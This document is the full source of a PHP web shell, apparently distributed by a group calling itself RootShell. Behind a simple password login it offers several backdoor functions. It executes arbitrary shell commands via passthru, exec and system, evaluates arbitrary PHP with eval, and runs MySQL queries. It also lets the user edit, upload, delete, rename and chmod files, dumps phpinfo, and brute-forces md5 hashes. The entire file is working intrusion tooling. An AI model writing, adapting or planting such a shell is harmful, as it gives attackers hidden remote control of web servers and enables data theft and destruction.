<?php
error_reporting(0); //If there is an error, we'll show it, k?

$password = "login"; // You can put a md5 string here too, for plaintext passwords: max 31 chars.

$me = basename(__FILE__);
$cookiename = "wieeeee";


if(isset($_POST['pass'])) //If the user made a login attempt, "pass" will be set eh?
{

    if(strlen($password) == 32) //If the length of the password is 32 characters, threat it as an md5.
    {
        $_POST['pass'] = md5($_POST['pass']);
    }

    if($_POST['pass'] == $password)
    {
            setcookie($cookiename, $_POST['pass'], time()+3600); //It's alright, let hem in
    }
    reload();
}



if(!empty($password) && !isset($_COOKIE[$cookiename]) or ($_COOKIE[$cookiename] != $password))
{
    login();
    die();
}
//
//Do not cross this line! All code placed after this block can't be executed without being logged in!
//

if(isset($_GET['p']) && $_GET['p'] == "logout")
{
setcookie ($cookiename, "", time() - 3600);
reload();
}
if(isset($_GET['dir']))
{
    chdir($_GET['dir']);
}


$pages = array(
    'cmd' => 'Execute Command',
    'eval' => 'Evaluate PHP',
    'mysql' => 'MySQL Query',
    'chmod' => 'Chmod File',
    'phpinfo' => 'PHPinfo',
    'md5' => 'md5 cracker',
    'headers' => 'Show headers',
    'logout' => 'Log out'
);

//The header, like it?
$header = '<html>
<title>'.getenv("HTTP_HOST").' ~ Shell I</title>
<head>
<style>
td {
    font-size: 12px; 
    font-family: verdana;
    color: #33FF00;
    background: #000000;
}

#d {
    background: #003000;
}
#f {
    background: #003300;
}
#s {
    background: #006300;
}
#d:hover
{
    background: #003300;
}
#f:hover
{
    background: #003000;
}
pre {
    font-size: 10px; 
    font-family: verdana;
    color: #33FF00;
}
a:hover {
text-decoration: none;
}


input,textarea,select {
    border-top-width: 1px; 
    font-weight: bold; 
    border-left-width: 1px; 
    font-size: 10px; 
    border-left-color: #33FF00; 
    background: #000000; 
    border-bottom-width: 1px; 
    border-bottom-color: #33FF00; 
    color: #33FF00; 
    border-top-color: #33FF00; 
    font-family: verdana; 
    border-right-width: 1px; 
    border-right-color: #33FF00;
}

hr {
color: #33FF00;
background-color: #33FF00;
height: 5px;
}

</style>

</head>
<body bgcolor=black alink="#33CC00" vlink="#339900" link="#339900">
<table width=100%><td id="header" width=100%>
<p align=right><b>[<a href="http://www.rootshell-team.info">RootShell</a>]  [<a href="'.$me.'">Home</a>] ';

foreach($pages as $page => $page_name)
{
    $header .= ' [<a href="?p='.$page.'&dir='.realpath('.').'">'.$page_name.'</a>] ';

}
$header .= '<br><hr>'.show_dirs('.').'</td><tr><td>';
print $header;

$footer = '<tr><td><hr><center>&copy; <a href="http://www.ironwarez.info">Iron</a> & <a href="http://www.rootshell-team.info">RootShell Security Group</a></center></td></table></body></head></html>';


//
//Page handling
//
if(isset($_REQUEST['p']))
{
        switch ($_REQUEST['p']) {
            
            case 'cmd': //Run command
                
                print "<form action=\"".$me."?p=cmd&dir=".realpath('.')."\" method=POST><b>Command:</b><input type=text name=command><input type=submit value=\"Execute\"></form>";
                    if(isset($_REQUEST['command']))
                    {
                        print "<pre>";
                        execute_command(get_execution_method(),$_REQUEST['command']); //You want fries with that?
                    }
            break;
            
            
            case 'edit': //Edit a fie
                if(isset($_POST['editform']))
                {
                    $f = $_GET['file'];
                    $fh = fopen($f, 'w') or print "Error while opening file!";
                    fwrite($fh, $_POST['editform']) or print "Couldn't save file!";
                    fclose($fh);
                }
                print "Editing file <b>".$_GET['file']."</b> (".perm($_GET['file']).")<br><br><form action=\"".$me."?p=edit&file=".$_GET['file']."&dir=".realpath('.')."\" method=POST><textarea cols=90 rows=15 name=\"editform\">";
                
                if(file_exists($_GET['file']))
                {
                    $rd = file($_GET['file']);
                    foreach($rd as $l)
                    {
                        print htmlspecialchars($l);
                    }
                }
                
                print "</textarea><input type=submit value=\"Save\"></form>";
                
            break;
            
            case 'delete': //Delete a file
            
                if(isset($_POST['yes']))
                {
                    if(unlink($_GET['file']))
                    {
                        print "File deleted successfully.";
                    }
                    else
                    {
                        print "Couldn't delete file.";
                    }
                }
                
                
                if(isset($_GET['file']) && file_exists($_GET['file']) && !isset($_POST['yes']))
                {
                    print "Are you sure you want to delete ".$_GET['file']."?<br>
                    <form action=\"".$me."?p=delete&file=".$_GET['file']."\" method=POST>
                    <input type=hidden name=yes value=yes>
                    <input type=submit value=\"Delete\">
                    ";
                }
            
            
            break;
            
            
            case 'eval': //Evaluate PHP code
            
                print "<form action=\"".$me."?p=eval\" method=POST>
                <textarea cols=60 rows=10 name=\"eval\">";
                if(isset($_POST['eval']))
                {
                    print htmlspecialchars($_POST['eval']);
                }
                else
                {
                    print "print \"Yo Momma\";";
                }
                print "</textarea><br>
                <input type=submit value=\"Eval\">
                </form>";
                
                if(isset($_POST['eval']))
                {
                    print "<h1>Output:</h1>";
                    print "<br>";
                    eval($_POST['eval']);
                }
            
            break;
            
            case 'chmod': //Chmod file
                
                
                print "<h1>Under construction!</h1>";
                if(isset($_POST['chmod']))
                {
                switch ($_POST['chvalue']){
                    case 777:
                    chmod($_POST['chmod'],0777);
                    break;
                    case 644:
                    chmod($_POST['chmod'],0644);
                    break;
                    case 755:
                    chmod($_POST['chmod'],0755);
                    break;
                }
                print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
                }
                if(isset($_GET['file']))
                {
                    $content = urldecode($_GET['file']);
                }
                else
                {
                    $content = "file/path/please";
                }
                
                print "<form action=\"".$me."?p=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>File to chmod:
                <input type=text name=chmod value=\"".$content."\" size=70><br><b>New permission:</b>
                <select name=\"chvalue\">
<option value=\"777\">777</option>
<option value=\"644\">644</option>
<option value=\"755\">755</option>
</select><input type=submit value=\"Change\">";
                
            break;
            
            case 'mysql': //MySQL Query
            
            if(isset($_POST['host']))
            {
                $link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . mysql_error());
                mysql_select_db($_POST['dbase']);
                $sql = $_POST['query'];
                
                
                $result = mysql_query($sql);
                
            }
            else
            {
                print "
                This only queries the database, doesn't return data!<br>
                <form action=\"".$me."?p=mysql\" method=POST>
                <b>Host:<br></b><input type=text name=host value=\"localhost\" size=10><br>
                <b>Username:<br><input type=text name=username value=\"root\" size=10><br>
                <b>Password:<br></b><input type=password name=mysqlpass value=\"\" size=10><br>
                <b>Database:<br><input type=text name=dbase value=\"test\" size=10><br>
                
                <b>Query:<br></b<textarea name=query></textarea>
                <input type=submit value=\"Query database\">
                </form>
                ";
                
            }
            
            break;
            
            case 'createdir':
            if(mkdir($_GET['crdir']))
            {
            print 'Directory created successfully.';
            }
            else
            {
            print 'Couldn\'t create directory';
            }
            break;
            
            
            case 'phpinfo': //PHP Info
                phpinfo();
            break;
            
            
            case 'rename':
            
                if(isset($_POST['fileold']))
                {
                    if(rename($_POST['fileold'],$_POST['filenew']))
                    {
                        print "File renamed.";
                    }
                    else
                    {
                        print "Couldn't rename file.";
                    }
                    
                }
                if(isset($_GET['file']))
                {
                    $file = basename(htmlspecialchars($_GET['file']));
                }
                else
                {
                    $file = "";
                }
                
                print "Renaming ".$file." in folder ".realpath('.').".<br>
                                <form action=\"".$me."?p=rename&dir=".realpath('.')."\" method=POST>
                    <b>Rename:<br></b><input type=text name=fileold value=\"".$file."\" size=70><br>
                    <b>To:<br><input type=text name=filenew value=\"\" size=10><br>
                    <input type=submit value=\"Rename file\">
                    </form>";
            break;
            
            case 'md5':
            if(isset($_POST['md5']))
            {
            if(!is_numeric($_POST['timelimit']))
            {
            $_POST['timelimit'] = 30;
            }
            set_time_limit($_POST['timelimit']);
                if(strlen($_POST['md5']) == 32)
                {
                    
                        if($_POST['chars'] == "9999")
                        {
                        $i = 0;
                        while($_POST['md5'] != md5($i) && $i != 100000)
                            {
                                $i++;
                            }
                        }
                        else
                        {
                            for($i = "a"; $i != "zzzzz"; $i++)
                            {
                                if(md5($i == $_POST['md5']))
                                {
                                    break;
                                }
                            }
                        }

                    
                    if(md5($i) == $_POST['md5'])
                    {
                            print "<h1>Plaintext of ". $_POST['md5']. " is <i>".$i."</i></h1><br><br>";
                    }
                    
                }
                
            }
            
            print "Will bruteforce the md5
                <form action=\"".$me."?p=md5\" method=POST>
                <b>md5 to crack:<br></b><input type=text name=md5 value=\"\" size=40><br>
                <b>Characters:</b><br><select name=\"chars\">
                <option value=\"az\">a - zzzzz</option>
                <option value=\"9999\">1 - 9999999</option>
                </select>
                <b>Max. cracking time*:<br></b><input type=text name=timelimit value=\"30\" size=2><br>
                <input type=submit value=\"Bruteforce md5\">
                </form><br>*: if set_time_limit is allowed by php.ini";
            break;
            
            case 'headers':
            foreach(getallheaders() as $header => $value)
            {
            print htmlspecialchars($header . ":" . $value)."<br>";
            
            }
            break;
        }

}
else //Default page that will be shown when the page isn't found or no page is selected.
{
    
    $files = array();
    $directories = array();
    
    if(isset($_FILES['uploadedfile']['name']))
{
    $target_path = realpath('.').'/';
    $target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 

    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
        print "File:".  basename( $_FILES['uploadedfile']['name']). 
        " has been uploaded";
    } else{
        echo "File upload failed!";
    }
}


    
    
    
    print "<table border=0 width=100%><td width=5% id=s><b>Options</b></td><td id=s><b>Filename</b></td><td id=s><b>Size</b></td><td id=s><b>Permissions</b></td><td id=s>Last modified</td><tr>";
    if ($handle = opendir('.'))
    {
        while (false !== ($file = readdir($handle))) 
        {
              if(is_dir($file))
              {
                $directories[] = $file;
              }
              else
              {
                $files[] = $file;
              }
        }
    asort($directories);
    asort($files);
        foreach($directories as $file)
        {
            print "<td id=d><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\">[D]</a></td><td id=d><a href=\"".$me."?dir=".realpath($file)."\">".$file."</a></td><td id=d></td><td id=d><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=d>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
        }
        
        foreach($files as $file)
        {
            print "<td id=f><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\">[D]</a></td><td id=f><a href=\"".$me."?p=edit&dir=".realpath('.')."&file=".realpath($file)."\">".$file."</a></td><td id=f>".filesize($file)."</td><td id=f><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=f>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
        }
    }
    else
    {
        print "<u>Error!</u> Can't open <b>".realpath('.')."</b>!<br>";
    }
    
    print "</table><hr><table border=0 width=100%><td><b>Upload file</b><br><form enctype=\"multipart/form-data\" action=\"".$me."?dir=".realpath('.')."\" method=\"POST\">
<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000000\" /><input size=30 name=\"uploadedfile\" type=\"file\" />
<input type=\"submit\" value=\"Upload File\" />
</form></td><td><form action=\"".$me."\" method=GET><b>Change Directory<br></b><input type=text size=40 name=dir value=\"".realpath('.')."\"><input type=submit value=\"Change Directory\"></form></td>
<tr><td><form action=\"".$me."\" method=GET><b>Create file<br></b><input type=hidden name=dir value=\"".realpath('.')."\"><input type=text size=40 name=file value=\"".realpath('.')."\"><input type=hidden name=p value=edit><input type=submit value=\"Create file\"></form>
</td><td><form action=\"".$me."\" method=GET><b>Create directory<br></b><input type=text size=40 name=crdir value=\"".realpath('.')."\"><input type=hidden name=dir value=\"".realpath('.')."\"><input type=hidden name=p value=createdir><input type=submit value=\"Create directory\"></form></td>
</table>";


}


function login()
{
    print "<table border=0 width=100% height=100%><td valign=\"middle\"><center>
    <form action=".basename(__FILE__)." method=\"POST\"><b>Password?</b>
    <input type=\"password\" maxlength=\"32\" name=\"pass\"><input type=\"submit\" value=\"Login\">
    </form>";
}
function reload()
{
    header("Location: ".basename(__FILE__));
}

function get_execution_method()
{
    if(function_exists('passthru')){ $m = "passthru"; }
    if(function_exists('exec')){ $m = "exec"; }
    if(function_exists('shell_exec')){ $m = "shell_ exec"; }
    if(function_exists('system')){ $m = "system"; }
    if(!isset($m)) //No method found :-|
    {
        $m = "Disabled";
    }
    return($m);
}

function execute_command($method,$command)
{
    if($method == "passthru")
    {
        passthru($command);
    }
    
    elseif($method == "exec")
    {
        exec($command,$result);
        foreach($result as $output)
        {
            print $output."<br>";
        }
    }
    
    elseif($method == "shell_exec")
    {
        print shell_exec($command);
    }
    
    elseif($method == "system")
    {
        system($command);
    }

}

function perm($file)
{
    if(file_exists($file))
    {
        return substr(sprintf('%o', fileperms($file)), -4);
    }
    else
    {
        return "????";
    }
}

function get_color($file)
{
if(is_writable($file)) { return "green";}
if(!is_writable($file) && is_readable($file)) { return "white";}
if(!is_writable($file) && !is_readable($file)) { return "red";}



}

function show_dirs($where)
{
    if(ereg("^c:",realpath($where)))
    {
    $dirparts = explode('\\',realpath($where));
    }
    else
    {
    $dirparts = explode('/',realpath($where));
    }
    
    
    
    $i = 0;
    $total = "";
    
    foreach($dirparts as $part)
    {
        $p = 0;
        $pre = "";
        while($p != $i)
        {
            $pre .= $dirparts[$p]."/";
            $p++;
            
        }
        $total .= "<a href=\"".basename(__FILE__)."?dir=".$pre.$part."\">".$part."</a>/";
        $i++;
    }
    
    return "<h2>".$total."</h2><br>";

}
print $footer;

// Exit: maybe we're included somewhere and we don't want the other code to mess with ours :-)
exit();
?>
